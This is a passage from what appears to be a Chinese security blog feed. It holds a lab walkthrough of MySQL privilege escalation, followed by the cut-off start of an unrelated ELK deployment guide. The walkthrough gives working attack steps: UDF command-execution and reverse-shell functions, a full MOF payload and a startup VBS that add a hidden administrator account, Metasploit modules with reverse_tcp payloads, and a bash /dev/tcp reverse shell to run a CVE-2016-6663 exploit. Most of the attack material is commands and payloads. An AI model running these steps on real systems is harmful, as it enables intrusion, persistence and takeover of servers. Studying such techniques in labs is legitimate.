src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020111552648.png" alt="image-20211020111552648"></p><p>导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020112417755.png" alt="image-20211020112417755"></p><p>这里的 sys_eval 支持自定义，接着就可以通过创建的这个函数来执行系统命令了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>如果在 Windows 系统下的话应该就是最高权限了，执行一些 net user 增加用户的命令应该都是可以成功的</p></blockquote><h3 id="删除自定义函数"><a href="#删除自定义函数" class="headerlink" title="删除自定义函数"></a>删除自定义函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure><h2 id="UDF-PHP"><a href="#UDF-PHP" class="headerlink" title="UDF.PHP"></a>UDF.PHP</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020114906003.png" alt="image-20211020114906003"></p><h2 id="Navicat-MySQL"><a href="#Navicat-MySQL" class="headerlink" title="Navicat MySQL"></a>Navicat MySQL</h2><p>navicat安装目录下自带tunnel 隧道脚本</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020115213273.png" alt="image-20211020115213273"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020124709803.png" alt="image-20211020124709803"></p><p>使用php脚本建立http连接</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028104034319.png" alt="image-20211028104034319"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020125405937.png" alt="image-20211020125405937"></p><h2 id="反弹shell提权"><a href="#反弹shell提权" class="headerlink" title="反弹shell提权"></a>反弹shell提权</h2><p><a href="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/document/langouster_udf.zip">https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/document/langouster_udf.zip</a></p><h3 id="使用SQL语句执行cmd创建功能函数"><a href="#使用SQL语句执行cmd创建功能函数" class="headerlink" title="使用SQL语句执行cmd创建功能函数"></a>使用SQL语句执行cmd创建功能函数</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028134405581.png" alt="image-20211028134405581"></p><blockquote><p>注意创建的函数要是下面列表中存在的</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmdshell 执行cmd;</span><br><span class="line">downloader 下载者,到网上下载指定文件并保存到指定目录;</span><br><span class="line">open3389 通用开3389终端服务,可指定端口(不改端口无需重启);</span><br><span class="line">backshell 反弹Shell;</span><br><span class="line">ProcessView 枚举系统进程;</span><br><span class="line">KillProcess 终止指定进程;</span><br><span class="line">regread 读注册表;</span><br><span class="line">regwrite 写注册表;</span><br><span class="line">shut 关机,注销,重启;</span><br><span class="line">about 说明与帮助函数;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028135012856.png" alt="image-20211028135012856"></p><h3 id="创建反弹shell的函数"><a href="#创建反弹shell的函数" class="headerlink" title="创建反弹shell的函数"></a>创建反弹shell的函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> backshell <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028140540898.png" alt="image-20211028140540898"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> backshell(&quot;192.168.201.144&quot;, <span class="number">2333</span>)</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028140623641.png" alt="image-20211028140623641"></p><p>消除乱码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><h1 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h1><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是<code>C:/Windows/system32/wbem/mof/</code>目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p><h2 id="在winser2003部署mysql"><a href="#在winser2003部署mysql" class="headerlink" title="在winser2003部署mysql"></a>在winser2003部署mysql</h2><p>确定服务器32位</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028145310492.png" alt="image-20211028145310492"></p><blockquote><ol><li>系统类型为X86-based PC就是32位</li><li>系统类型为X64-based PC就是64位</li></ol></blockquote><p><a href="https://downloads.mysql.com/archives/community/">下载mysql</a></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028145441831.png" alt="image-20211028145441831"></p><h2 id="手动复现"><a href="#手动复现" class="headerlink" title="手动复现"></a>手动复现</h2><h3 id="上传-mof-文件执行命令"><a href="#上传-mof-文件执行命令" class="headerlink" title="上传 mof 文件执行命令"></a>上传 mof 文件执行命令</h3><p>mof 脚本的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;; </span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line">    ScriptText = </span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>核心payload为：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var WSH = <span class="keyword">new</span> ActiveXObject(\<span class="string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)</span><br></pre></td></tr></table></figure><p>MySQL 写文件的特性将这个 MOF 文件导入到 <code>C:/Windows/system32/wbem/mof/</code> 目录下，依然采用上述编码的方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0xinto dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;</span><br></pre></td></tr></table></figure><p>执行成功的的时候，test.mof 会出现在：<code>C:\WINDOWS\system32\wbem\mof\good</code> 目录下 否则出现在 <code>C:\WINDOWS\system32\wbem\mof\bad</code> 目录下：</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028151547142.png" alt="image-20211028151547142"></p><p>核心payload中的账号已经生成</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028151834628.png" alt="image-20211028151834628"></p><h3 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h3><p>因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 停止 winmgmt 服务</span></span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 Repository 文件夹</span></span><br><span class="line">rmdir /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动删除 mof 文件</span></span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除创建的用户</span></span><br><span class="line">net user hacker /delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新启动服务</span></span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure><h2 id="MSF-MOF-提权"><a href="#MSF-MOF-提权" class="headerlink" title="MSF MOF 提权"></a>MSF MOF 提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="comment"># 设置好自己的 payload</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="comment"># 设置目标 MySQL 的基础信息</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> rhosts 192.168.201.159</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> username root</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> password root</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028153208039.png" alt="image-20211028153208039"></p><h1 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h1><h2 id="手工复现-1"><a href="#手工复现-1" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="启动项路径"><a href="#启动项路径" class="headerlink" title="启动项路径"></a>启动项路径</h3><p><strong>Windows Server 2003</strong> 的启动项路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 中文系统</span><br><span class="line">C:\Documents and Settings\Administrator\「开始」菜单\程序\启动</span><br><span class="line">C:\Documents and Settings\All Users\「开始」菜单\程序\启动</span><br><span class="line"></span><br><span class="line"># 英文系统</span><br><span class="line">C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"></span><br><span class="line"># 开关机项 需要自己建立对应文件夹</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</span><br></pre></td></tr></table></figure><p><strong>Windows Server 2008</strong> 的启动项路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> WshShell=WScript.<span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">WshShell.Run <span class="string">&quot;net user hacker P@ssw0rd /add&quot;</span>, <span class="number">0</span></span><br><span class="line">WshShell.Run <span class="string">&quot;net localgroup administrators hacker /add&quot;</span>, <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="Mysql写入启动项"><a href="#Mysql写入启动项" class="headerlink" title="Mysql写入启动项"></a>Mysql写入启动项</h3><p>将上述 vbs 或者 CS 的马转十六进制直接写如到系统启动项中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A into dumpfile &quot;C:\\Documents and Settings\Administrator\\「开始」菜单\\程序\\启动\\test.vbs&quot;;</span><br></pre></td></tr></table></figure><p>写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。</p><h2 id="MSF-启动项提权"><a href="#MSF-启动项提权" class="headerlink" title="MSF 启动项提权"></a>MSF 启动项提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_start_up</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 MySQL 连接信息</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> rhosts 192.168.201.159</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> username root</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> password root</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028163924059.png" alt="image-20211028163924059"></p><blockquote><p>写不进去，下次再看</p></blockquote><h1 id="CVE-2016-6663"><a href="#CVE-2016-6663" class="headerlink" title="CVE-2016-6663"></a>CVE-2016-6663</h1><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p>部署国光师傅打包的一个 Docker 镜像(用户名为root密码为空)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拉取镜像</span></span><br><span class="line">docker pull sqlsec/cve-2016-6663</span><br><span class="line"><span class="comment"># 部署镜像</span></span><br><span class="line">docker run -d -p 3306:3306 -p 8080:80 --name CVE-2016-6663 sqlsec/cve-2016-6663</span><br></pre></td></tr></table></figure><p>添加一个 test 数据库用户，密码为 123456 并赋予一些基础权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 创建 test 数据库</span><br><span class="line">mysql &gt; create database test;</span><br><span class="line"></span><br><span class="line"># 设置 test 密码为 123456</span><br><span class="line">mysql &gt; CREATE USER &#x27;test&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27;; </span><br><span class="line"></span><br><span class="line"># 赋予基础权限</span><br><span class="line">mysql &gt; grant create,drop,insert,select on test.* to &#x27;test&#x27;@&#x27;%&#x27;;</span><br><span class="line"></span><br><span class="line"># 刷新权限</span><br><span class="line">mysql &gt; flush privileges;</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>竞争条件提权漏洞，一个拥有 CREATE/INSERT/SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限</p><p><strong>利用成功条件</strong></p><ol><li>Getshell 拿到 www-data 权限</li><li>拿到 CREATE/INSERT/SELECT 低权限的 MySQL 账户</li><li>关键提取步骤需要在交互环境下，所以需要反弹 shell</li><li>MySQL 版本需要 &lt;=5.5.51 或 5.6.x &lt;=5.6.32 或 5.7.x &lt;=5.7.14 或 8.x &lt; 8.0.1</li><li>MariaDB 版本需要 &lt;= 5.5.51 或 10.0.x &lt;= 10.0.27 或 10.1.x &lt;= 10.1.17</li></ol><p>CVE-2016-6663 EXP mysql-privesc-race.c 参考链接：<a href="https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html">MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit</a></p><p>shell国光师傅已经给出来了</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028180554314.png" alt="image-20211028180554314"></p><p>通过蚁剑上传 EXP，然后 Bash 反弹 shell：</p><p>首先 192.168.201.144 端口开启监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -lvp 2333</span><br></pre></td></tr></table></figure><p>在蚁剑终端，反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.201.144/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>编译<a href="http://test-pic-test.oss-cn-guangzhou.aliyuncs.com/document/mysql-privesc-race.c">exp</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc mysql-privesc-race.c -o mysql-privesc-race -I /usr/include/mysql -lmysqlclient</span><br></pre></td></tr></table></figure><p>执行exp提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库</span></span><br><span class="line">./mysql-privesc-race <span class="built_in">test</span> 123456 localhost <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028185918252.png" alt="image-20211028185918252"></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySql </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELK部署</title>
      <link href="/p/dd49d155.html"/>
      <url>/p/dd49d155.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.elastic.co/elasticsearch/">Elasticsearch</a> 是一个非常强大的搜索引擎。它目前被广泛地使用于各个IT公司。Elasticsearch 是由 <a href="http://elastic.co/">Elastic</a> 公司创建。它的代码位于 <a href="https://github.com/elastic/elasticsearch%E3%80%82%E7%9B%AE%E5%89%8D%EF%BC%8CElasticsearch">https://github.com/elastic/elasticsearch。目前，Elasticsearch</a> 是一个免费及开放（free and open）的项目。同时，Elastic 公司也拥有 <a href="https://github.com/elastic/logstash">Logstash</a> 及 <a href="https://github.com/elastic/kibana">Kibana</a> 开源项目。这个三个开源项目组合在一起，就形成了 <strong>ELK</strong> 软件栈。他们三个共同形成了一个强大的生态圈。简单地说，<strong>L</strong>ogstash 负责数据的采集，处理（丰富数据，数据转换等），<strong>Ki</strong>bana 负责数据展示，分析，管理，监督及应用。Elasticsearch 处于最核心的位置，它可以帮我们对数据进行快速地搜索及分析。</p><h2 id="部署Elasticsearch"><a href="#部署Elasticsearch" class="headerlink" title="部署Elasticsearch"></a>部署Elasticsearch</h2><p>下载地址</p><p><a href="https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.15.0-linux-x86_64.tar.gz">LINUX X86_64</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -xzf elasticsearch-7.15.0-linux-x86_64.tar.gz</span><br><span class="line">cd elasticsearch-7.15.0</span><br></pre></td></tr></table></figure><p>修改配置文件</p><p><code>/home/user/elasticsearch-7.15.0/config/elasticsearch.yml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">network.host: 0.0.0.0</span><br><span class="line">discovery.seed_hosts: [&quot;0.0.0.0&quot;] #解决报错[3]</span><br></pre></td></tr></table></figure><blockquote><p>通过设置 network.host 为 0.0.0.0，它表明 Elasticsearch 可以绑定电脑的任何 IP 地址。你可以使用私有地址 http://<private_ip>:9200 来进行访问。当然你可以通过 <a href="http://localhost:9200/">http://localhost:9200</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node.name: node-1</span><br><span class="line">cluster.initial_master_nodes: [&quot;node-1&quot;]</span><br></pre></td></tr></table></figure><blockquote><p>这里不设置kibana启动不了，报<code>Kibana server is not ready yet</code></p></blockquote><mark class="hl-label red">报错</mark> <p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005183130348.png" alt="image-20211005183130348"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ERROR: [3] bootstrap checks failed. You must address the points described in the following [3] lines before starting Elasticsearch.</span><br><span class="line">bootstrap check failure [1] of [3]: max file descriptors [4096] for elasticsearch process is too low, increase to at least [65535]</span><br><span class="line">bootstrap check failure [2] of [3]: max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]</span><br><span class="line">bootstrap check failure [3] of [3]: the default discovery settings are unsuitable for production use; at least one of [discovery.seed_hosts, discovery.seed_providers, cluster.initial_master_nodes] must be configured</span><br></pre></td></tr></table></figure><p>解决方法 <a href="https://blog.csdn.net/feng12345zi/article/details/80367907">ElasticSearch启动报错，bootstrap checks failed</a></p><p>[1]max file descriptors [4096] for elasticsearch process is too low, increase to at least [65536]</p><p>编辑 <code>/etc/security/limits.conf</code>，追加以下内容；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* soft nofile 65536</span><br><span class="line">* hard nofile 65536</span><br></pre></td></tr></table></figure><blockquote><p>此文件修改后需要重新登录用户，才会生效</p></blockquote><p>[2]max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]</p><p>编辑 <code>/etc/sysctl.conf</code>，追加以下内容：</p><p><code>vm.max_map_count=262144</code></p><p>保存后，执行：</p><p><code>sysctl -p</code></p><p>启动Elasticsearch</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost user]# netstat -ntlp|grep 9*00</span><br><span class="line">tcp6       0      0 :::9200                 :::*                    LISTEN      20512/java          </span><br><span class="line">tcp6       0      0 :::9300                 :::*                    LISTEN      20512/java</span><br></pre></td></tr></table></figure><blockquote><p>9300:集群内节点通讯端口<br>9200:Elasticsearch开放的REST接口</p></blockquote><p>命令行访问</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://localhost:9200/?pretty&#x27;</span><br></pre></td></tr></table></figure><p>浏览器访问</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005215047008.png" alt="image-20211005215047008"></p><p>作为进程守护运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch -d -p pid</span><br></pre></td></tr></table></figure><blockquote><p>上面的这个命令把运行的进程存放于一个叫做 pid 的文件之中，为了方便下面的终止。可以在 $ES_HOME/logs/ 目录中找到日志消息。</p></blockquote><p>要关闭 Elasticsearch，请终止 pid 文件中记录的进程 ID</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkill -F pid</span><br></pre></td></tr></table></figure><p>通过如下的 jps （Java Virtual Machine Process Status Tool）来查看 Elasticsearch 的运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost user]# jps | grep Elasticsearch</span><br><span class="line">4721 Elasticsearch</span><br></pre></td></tr></table></figure><blockquote><p><code>yum install -y  java-1.8.0-openjdk-devel</code></p></blockquote><p>停止运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 4721</span><br></pre></td></tr></table></figure><p><a href="https://elasticstack.blog.csdn.net/article/details/99413578">参考链接</a></p><h2 id="部署Kibana"><a href="#部署Kibana" class="headerlink" title="部署Kibana"></a>部署Kibana</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://artifacts.elastic.co/downloads/kibana/kibana-7.15.0-linux-x86_64.tar.gz</span><br><span class="line">tar -zxf kibana-7.15.0-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/kibana</span><br></pre></td></tr></table></figure><p>修改配置文件<code>/config/kibana.yml</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch.hosts: [&quot;http://localhost:9200&quot;]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将localhost修改为Elasticsearch所在ip</span></span><br><span class="line">i18n.locale: &quot;zh-CN&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">设置中文</span></span><br></pre></td></tr></table></figure><h2 id="部署Winlogbeat"><a href="#部署Winlogbeat" class="headerlink" title="部署Winlogbeat"></a>部署Winlogbeat</h2><h3 id="下载并安装-Winlogbeat"><a href="#下载并安装-Winlogbeat" class="headerlink" title="下载并安装 Winlogbeat"></a>下载并安装 Winlogbeat</h3><p><a href="http://192.168.77.198:5601/app/home#/tutorial/windowsEventLogs">下载</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\Program Files\Winlogbeat&quot;</span></span><br><span class="line">.\<span class="built_in">install-service</span><span class="literal">-winlogbeat</span>.ps1</span><br></pre></td></tr></table></figure><blockquote></blockquote><p>在 <code>C:\Program Files\Winlogbeat\winlogbeat.yml</code> 文件中修改 <code>output.elasticsearch</code> 下的设置以指向您的 Elasticsearch 安装。</p><h3 id="编辑配置"><a href="#编辑配置" class="headerlink" title="编辑配置"></a>编辑配置</h3><p>修改 <code>C:\Program 